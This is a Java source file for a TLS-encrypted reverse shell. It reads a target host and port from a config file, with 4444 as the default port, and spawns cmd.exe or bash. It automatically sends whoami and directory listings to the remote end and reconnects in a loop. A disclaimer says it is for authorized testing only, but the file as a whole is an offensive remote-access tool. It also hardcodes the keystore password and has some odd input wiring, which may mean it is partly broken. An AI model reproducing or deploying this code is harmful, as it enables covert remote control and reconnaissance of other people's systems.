/*
This code is provided for educational and authorized security testing purposes ONLY.

By using this code, you agree that:
1. You have explicit permission to test the target system.
2. The author takes NO responsibility for misuse, damages, or legal consequences.
3. Unauthorized use on systems you do not own or have permission for is ILLEGAL.

Always act ethically and responsibly.
*/
package NetworkShell;

import com.moandjiezana.toml.Toml;

import javax.net.ssl.*;
import java.io.*;
import java.net.InetAddress;
import java.net.Socket;
import java.net.UnknownHostException;
import java.security.KeyStore;

public class ShellConnector {

        public static long dataPortCheck(){
        try {
            Toml toml = new Toml().read(new File("config.toml"));

            long shellConnector = toml.getTable("ports").getLong("connector");
            System.out.println("Set port:" + shellConnector);

            String shellIP = toml.getTable("ip").getString("ip");
            System.out.println("Set IP: " + shellIP);

            return shellConnector;


        }catch (Exception e){
            System.out.println("Error: "+e.getMessage());
            System.out.println("No set port using default port 4444");
            return 4444;
        }
    }

    public static String dataIPCheck(){
        try {
            Toml toml = new Toml().read(new File("config.toml"));

            String shellConnector = toml.getTable("ip").getString("ip");
            System.out.println("Set port:" + shellConnector);

            String shellIP = toml.getTable("ip").getString("ip");
            System.out.println("Set IP: " + shellIP);

            return shellConnector;

        }catch (Exception e){
            System.out.println("Error: "+e.getMessage());
            System.out.println("No set port using default port 4444");
            return "127.0.0.1";
        }
    }

    public static SSLSocket createTLSSocket(String host, int port) throws Exception {
        KeyStore keyStore = KeyStore.getInstance("JKS");
        try (FileInputStream fileInputStream = new FileInputStream("/NetworkShell/shellkeystore.jks")) {
            keyStore.load(fileInputStream, "password".toCharArray());
        }
        KeyManagerFactory keyManagerFactory = KeyManagerFactory.getInstance("SunX509");
        keyManagerFactory.init(keyStore, "password".toCharArray());

        TrustManagerFactory trustManagerFactory = TrustManagerFactory.getInstance("SunX509");
        trustManagerFactory.init(keyStore);

        SSLContext sslContext = SSLContext.getInstance("TLS");
        sslContext.init(keyManagerFactory.getKeyManagers(), trustManagerFactory.getTrustManagers(), null);


        SSLSocketFactory factory = sslContext.getSocketFactory();
        return (SSLSocket) factory.createSocket(host, port);

    }

    public static void Shell(Process process, Socket socket) throws Exception {
        InputStream processInput = process.getInputStream();
        OutputStream processOutput = process.getOutputStream();
        OutputStream socketOutput = socket.getOutputStream();

        byte[] buffer = new byte[1024];
        int read;

        Thread processToSocket = new Thread(() -> {
            try {
                while (!socket.isClosed()) {
                    while (processInput.available() > 0) {
                        int n = processInput.read(buffer);
                        if (n > 0) {
                            socketOutput.write(buffer, 0, n);
                            socketOutput.flush();
                            System.out.write(buffer, 0, n); 
                            System.out.flush();
                        }
                    }
                    Thread.sleep(50);
                }
            } catch (Exception ignored) {
            }
        });
        processToSocket.start();

        BufferedReader consoleReader = new BufferedReader(new InputStreamReader(System.in));
        String line;
        while ((line = consoleReader.readLine()) != null) {
            processOutput.write((line + "\n").getBytes());
            processOutput.flush();
        }

        process.destroy();
        socket.close();
        System.out.println("Shell closed");
    }

    public static void autoDeploy(OutputStream socketOutput, String command) {
        try {
            String os = System.getProperty("os.name").toLowerCase();
            ProcessBuilder pb = os.contains("win") ?
                    new ProcessBuilder("cmd.exe", "/c", command) :
                    new ProcessBuilder("/bin/bash", "-c", command);
            pb.redirectErrorStream(true);
            Process proc = pb.start();

            InputStream in = proc.getInputStream();
            byte[] buffer = new byte[1024];
            int read;
            while ((read = in.read(buffer)) != -1) {
                socketOutput.write(buffer, 0, read);
                System.out.write(buffer, 0, read);
            }
            socketOutput.flush();
            System.out.flush();
            proc.waitFor();
        } catch (Exception e) {
            try {
                socketOutput.write(("Error running command " + command + ": " + e.getMessage() + "\n").getBytes());
                socketOutput.flush();
            } catch (Exception ignored) {
            }
        }
    }

    public static void main(String[] args) {
        boolean connectingToHost = true;
        InetAddress myIp = null;

        try {
            myIp = InetAddress.getLocalHost();
        } catch (UnknownHostException e) {
            throw new RuntimeException(e);
        }

        String host = dataIPCheck();

        long lPort = dataPortCheck();
        int port = (int)lPort;


        System.out.println("Device IP: " + myIp);
        System.out.println("Attempting to connect to: " + host + ":" + port);

        while (connectingToHost) {
            try {
                String os = System.getProperty("os.name").toLowerCase();
                Process process = os.contains("win") ?
                        new ProcessBuilder("cmd.exe").redirectErrorStream(true).start() :
                        new ProcessBuilder("/bin/bash").redirectErrorStream(true).start();

                SSLSocket socket = createTLSSocket(host, port);
                socket.startHandshake();
                OutputStream socketOutput = socket.getOutputStream();

                new Thread(() -> {
                    try {
                        if (os.contains("win")) {
                            autoDeploy(socketOutput, "whoami");
                            autoDeploy(socketOutput, "cd");
                            autoDeploy(socketOutput, "dir");
                            
                        } else {
                            autoDeploy(socketOutput, "whoami");
                            autoDeploy(socketOutput, "pwd");
                            autoDeploy(socketOutput, "ls");
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }).start();

                Shell(process, socket);

            } catch (Exception e) {
                System.err.println("Reverse shell error: " + e.getMessage());
                try {
                    Thread.sleep(5000);
                } catch (InterruptedException ex) {
                    throw new RuntimeException(ex);
                }
            }
        }
    }
}
